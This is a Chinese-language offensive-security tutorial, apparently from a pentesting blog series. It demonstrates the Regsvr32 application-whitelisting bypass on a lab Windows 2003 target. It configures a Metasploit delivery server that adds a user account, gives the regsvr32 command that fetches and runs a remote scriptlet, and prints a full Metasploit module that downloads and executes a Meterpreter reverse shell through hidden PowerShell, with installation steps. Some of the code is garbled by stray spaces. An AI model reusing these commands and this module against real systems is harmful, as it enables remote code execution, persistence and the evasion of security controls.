# 专注APT攻击与防御
https://micropoor.blogspot.com/

**注：**请多喝点热水或者凉白开，身体特别重要。

**Regsvr32简介：**

Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000系统的regsvr32.exe在winnt\system32文件夹下。但搭配regsvr32.exe使用的 DLL，需要提供 DllRegisterServer 和 DllUnregisterServer两个输出函式，或者提供DllInstall输出函数。

**说明：**Regsvr32.exe所在路径已被系统添加PATH环境变量中，因此，Regsvr32命令可识别。

Windows 2003 默认位置：
`C:\WINDOWS\SysWOW64\regsvr32.exe
C:\WINDOWS\system32\regsvr32.exe`


**攻击机：**192.168.1.4 Debian
**靶机：** 192.168.1.119 Windows 2003

msf已内置auxiliary版本的regsvr32_command_delivery_server，但是最新版已经无exploit版本regsvr32，文章结尾补充。

**配置攻击机msf：**
```bash
msf auxiliary(server/regsvr32_command_delivery_server) > use auxiliary/server/regsvr32_command_delivery_server
msf auxiliary(server/regsvr32_command_delivery_server) > set CMD net user Micropoor Micropoor /add
CMD => net user Micropoor Micropoor /add
msf auxiliary(server/regsvr32_command_delivery_server) > exploit 

[*] Using URL: http://0.0.0.0:8080/ybn7xESQYCGv
[*] Local IP: http://192.168.1.4:8080/ybn7xESQYCGv
[*] Server started.
[*] Run the following command on the target machine:

regsvr32 /s /n /u /i:http://192.168.1.4:8080/ybn7xESQYCGv scrobj.dll 
```
![](media/415719c964de78a36a9cad8e7d273025.jpg)

**靶机执行：**
`regsvr32 /s /n /u /i:http://192.168.1.4:8080/ybn7xESQYCGv scrobj.dll`
![](media/d6dba86fd41bcac90db86ecc3dc6e7e7.jpg)

![](media/392c2c955e7d666b5015f30149866cf5.jpg)
![](media/d9c0e792eced1468f86880e42bc28a56.jpg)
![](media/d70caf10069603b0d0bffa73ecbabc29.jpg)

## 附：powershell版Regsvr32

**regsvr32_applocker_bypass_server.rb**
```ruby
##

# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit‐framework

## 

class MetasploitModule < Msf::Exploit::Remote
Rank = ManualRanking 

include Msf::Exploit::Powershell
include Msf::Exploit::Remote::HttpServer 

def initialize(info = {})
super(update_info(info,
'Name' => 'Regsvr32.exe (.sct) Application Whitelisting Bypass Serve r', 'Description' => %q(
This module simplifies the Regsvr32.exe Application Whitelisting Bypass technique.
The module creates a web server that hosts an .sct file. When the user types the provided regsvr32 command on a system, regsvr32 will request the .sct file and then execute the included PowerShell command.
This command then downloads and executes the specified payload (similar to the web_delivery module with PSH).
Both web requests (i.e., the .sct file and PowerShell download and execute) can occur on the same port.
),

'License' => MSF_LICENSE,
'Author' =>
[
'Casey Smith', # AppLocker bypass research and vulnerability discover y(\@subTee)
'Trenton Ivey', # MSF Module (kn0)
],
'DefaultOptions' =>
{
'Payload' => 'windows/meterpreter/reverse_tcp'
},
'Targets' => [['PSH', {}]],
'Platform' => %w(win),
'Arch' => [ARCH_X86, ARCH_X86_64],
'DefaultTarget' => 0,
'DisclosureDate' => 'Apr 19 2016',
'References' =>
[
['URL', 'http://subt0x10.blogspot.com/2016/04/bypass‐application‐whitelisting‐script.html']
]
))
end 

def primer
print_status('Run the following command on the target machine:')
print_line("regsvr32 /s /n /u /i:\#{get_uri}.sct scrobj.dll")
end 

def on_request_uri(cli, _request)
# If the resource request ends with '.sct', serve the .sct file
# Otherwise, serve the PowerShell payload
if _request.raw_uri =~ /\.sct$/
serve_sct_file
else
serve_psh_payload
end
end 

def serve_sct_file
print_status("Handling request for the .sct file from #{cli.peerhost}")
ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
download_string = Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(get_uri)
download_and_run = "#{ignore_cert}#{download_string}"
psh_command = generate_psh_command_line(
noprofile: true,
windowstyle: 'hidden',
command: download_and_run
)
data = gen_sct_file(psh_command)
send_response(cli, data, 'Content‐Type' => 'text/plain')
end 

def serve_psh_payload
print_status("Delivering payload to #{cli.peerhost}")
data = cmd_psh_payload(payload.encoded,
payload_instance.arch.first,
remove_comspec: true,
use_single_quotes: true
)
send_response(cli,data,'Content‐Type' => 'application/octet‐stream')
end 

def rand_class_id
"#{Rex::Text.rand_text_hex 8}‐#{Rex::Text.rand_text_hex 4}‐#{Rex::Text.rand_text_hex 4}‐#{Rex::Text.rand_text_hex 4}‐#{Rex::Text.rand_text_hex12}"
end 

def gen_sct_file(command)
%{<?XML version="1.0"?><scriptlet><registrationprogid="\#{rand_text_a lphanumeric 8}"
classid="{#{rand_class_id}}"><script><![CDATA[ var r = ne wActiveXObject("WScript.Shell").Run("#{command}",0);]]><script></registration></scriptlet>}
end 

end
```

**使用方法：**

copy regsvr32_applocker_bypass_server.rb to /usr/share/metasploit-framework/modules/exploits/windows/misc
![](media/f0b5c59eb47dd53e8780a31320b41113.jpg)

>   Micropoor
